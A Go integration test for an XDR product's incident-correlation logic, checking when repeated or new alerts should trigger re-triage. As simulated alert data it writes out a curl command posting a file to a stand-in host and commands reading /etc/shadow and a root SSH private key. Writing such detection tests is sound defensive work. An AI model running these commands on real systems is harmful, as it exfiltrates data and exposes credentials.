//go:build integration

package correlate

import (
	"testing"
	"time"

	"github.com/google/uuid"

	"openxdr/server/ent"
	"openxdr/server/internal/review"
	"openxdr/server/internal/sigma"
)

// ruleList 只提供规则清单的目录桩：普通规则与高危例外规则要能区分开
type ruleList []*sigma.Rule

func (r ruleList) Evaluate(int, string, map[string]any) []*sigma.Rule { return nil }
func (r ruleList) Rules() []*sigma.Rule                               { return r }
func (r ruleList) TitleOf(string) string                              { return "" }
func (r ruleList) AuthorOf(string) string                             { return "" }

// 生产实例：容器健康检查、开发机上的命令每几分钟命中同一条普通规则，命令行各不相同。
// 已研判的 incident 收下这些重复不再待重研判；新规则、新资产、级别升高照常；高危例外规则仍按实体认。
func TestRepeatsDoNotRetriage(t *testing.T) {
	f := newRecurFixture(t)
	f.eng.Rules = ruleList{
		{ID: "r-health", Tactics: []string{"discovery"}},
		{ID: "r-other", Tactics: []string{"execution"}},
		{ID: "r-cred", Tactics: []string{"credential-access"}},
	}
	hostA, hostB := f.asset("dynamicdefend-v2"), f.asset("uos-server")
	base := time.Now().Add(-time.Hour)
	at := func(m int) time.Time { return base.Add(time.Duration(m) * time.Minute) }
	health := func(host uuid.UUID, m int, cmd string) *ent.Alert {
		return f.proc(host, at(m), "r-health", "root", "/bin/sh", "/usr/bin/runc", cmd)
	}

	first := health(hostA, 0, "/bin/sh -c timeout 3 bash -c '</dev/tcp/127.0.0.1/8001' || exit 1")
	f.batch()
	inc := f.incidentOf(first)
	settle := func() {
		f.client.Incident.UpdateOneID(inc.ID).SetStatus("triaged").SetTriagedAt(time.Now()).SetNotifiedAt(time.Now()).ExecX(f.ctx)
	}
	check := func(what string, retriage, urgent bool) {
		t.Helper()
		got := f.client.Incident.GetX(f.ctx, inc.ID)
		if review.IsRetriage(got) != retriage || review.IsUrgent(got) != urgent {
			t.Errorf("%s：期望 retriage=%v urgent=%v，实际 evidence=%v urgent=%v triaged=%v",
				what, retriage, urgent, got.EvidenceAt, got.UrgentAt, got.TriagedAt)
		}
	}
	settle()

	// 同规则同资产：一模一样的、命令行不同的，跨批次与批内都不算新证据，但照常并入
	repeats := []*ent.Alert{health(hostA, 5, "/bin/sh -c timeout 3 bash -c '</dev/tcp/127.0.0.1/8001' || exit 1")}
	f.batch()
	repeats = append(repeats,
		health(hostA, 10, "/bin/sh -c timeout 3 bash -c '</dev/tcp/127.0.0.1/18080' || exit 1"),
		health(hostA, 15, "/bin/sh -c timeout 3 bash -c '</dev/tcp/127.0.0.1/8092' || exit 1"))
	f.batch()
	for _, al := range repeats {
		if f.incidentOf(al).ID != inc.ID {
			t.Errorf("重复告警 %s 应并入", al.Ts)
		}
	}
	check("同规则同资产的重复", false, false)

	// 新规则：待重研判（等冷却），不立即
	f.proc(hostA, at(20), "r-other", "root", "/usr/bin/curl", "/usr/bin/bash", "curl -d @/tmp/x http://a.example")
	f.batch()
	check("新规则", true, false)

	// 新资产：B 上的进程是 A 上告警进程的子进程，经血缘并入
	settle()
	guid := uuid.New()
	f.client.Event.UpdateOneID(*f.client.Alert.GetX(f.ctx, first.ID).EventID).SetProcessGUID(guid).ExecX(f.ctx)
	evt := f.client.Event.Create().SetTs(at(25)).SetClassUID(1007).SetSource("agent").SetAssetID(hostB).
		SetParentProcessGUID(guid).SetRaw([]byte(`{"process":{"cmd_line":"sh -c id","file":{"path":"/bin/sh"}}}`)).SaveX(f.ctx)
	onB := f.client.Alert.Create().SetTs(at(25)).SetRuleID("r-health").SetSeverity(2).SetEventID(evt.ID).SetAssetID(hostB).SaveX(f.ctx)
	f.batch()
	if f.incidentOf(onB).ID != inc.ID {
		t.Fatal("子进程告警应经血缘并入")
	}
	check("同规则新资产", true, false)

	// 级别升高：立即重研判
	settle()
	worse := health(hostA, 30, "/bin/sh -c timeout 3 bash -c '</dev/tcp/127.0.0.1/8001' || exit 1")
	f.client.Alert.UpdateOneID(worse.ID).SetSeverity(5).ExecX(f.ctx)
	f.batch()
	check("级别升高", true, true)

	// 高危例外规则：头一回立即，换实体按普通新证据，同实体再来不算
	settle()
	f.proc(hostA, at(35), "r-cred", "root", "/usr/bin/cat", "/usr/bin/bash", "cat /etc/shadow")
	f.batch()
	check("首现高危规则", true, true)
	settle()
	f.proc(hostA, at(40), "r-cred", "root", "/usr/bin/cat", "/usr/bin/bash", "cat /root/.ssh/id_rsa")
	f.batch()
	check("高危规则换实体", true, false)
	settle()
	f.proc(hostA, at(45), "r-cred", "root", "/usr/bin/cat", "/usr/bin/bash", "cat /root/.ssh/id_rsa")
	f.batch()
	check("高危规则同实体再来", false, false)
}
